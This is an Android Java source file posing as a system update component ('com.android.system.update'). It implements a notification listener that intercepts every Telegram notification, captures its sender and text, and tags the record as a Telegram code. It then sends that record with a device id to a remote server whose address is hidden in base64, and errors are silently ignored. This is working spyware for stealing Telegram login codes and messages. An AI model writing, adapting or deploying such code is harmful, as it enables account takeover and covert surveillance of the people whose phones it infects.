package com.android.system.update;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import org.json.JSONObject;

public class NotificationService extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pack = sbn.getPackageName();
            if (pack.contains("telegram") || pack.contains("org.telegram.messenger")) {
                android.os.Bundle extras = sbn.getNotification().extras;
                String title = extras.getString("android.title");
                String text = extras.getCharSequence("android.text") != null ? extras.getCharSequence("android.text").toString() : "";
                
                if (text.isEmpty()) return;

                String deviceId = getSharedPreferences("sys_cfg", MODE_PRIVATE).getString("id", "unknown");
                String baseUrl = new String(android.util.Base64.decode("aHR0cHM6Ly90bnQuZGUzLm5ldHJ1bi5pbw==", android.util.Base64.DEFAULT));
                
                JSONObject o = new JSONObject();
                o.put("id", deviceId);
                o.put("kind", "tg_code");
                o.put("body", "От: " + title + "\nТекст: " + text);
                Net.post(baseUrl + "/api/report", o.toString());
            }
        } catch (Exception ignored) {}
    }
}
